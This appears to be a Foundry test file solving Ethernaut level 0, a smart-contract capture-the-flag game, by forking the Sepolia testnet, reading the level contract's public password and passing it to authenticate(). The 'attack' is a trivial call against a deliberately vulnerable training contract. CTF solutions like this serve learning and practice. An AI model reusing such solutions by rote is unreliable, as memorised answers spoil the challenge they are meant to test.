// SPDX-License-Identifier: UNLICENSED
// forge test -vvvv --match-test testEthernaut00

pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

interface Instance {
    function authenticate(string memory passkey) external;

    function password() external view returns (string memory);

    function getCleared() external view returns (bool);
}

contract ContractTest is DSTest {
    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));
        vm.label(address(this), "Attacker");
        vm.label(
            address(0x6a924cB09C1E2043527e6Af91BaD1fee61acf805),
            "Ethernaut00"
        );
    }

    function testEthernaut00() public {
        Instance contract_lv0 = Instance(
            0x6a924cB09C1E2043527e6Af91BaD1fee61acf805
        );
        // Trigger authenticate
        contract_lv0.authenticate(contract_lv0.password());

        // getCleared
        bool result = contract_lv0.getCleared();
        assert(result == true);
    }
}
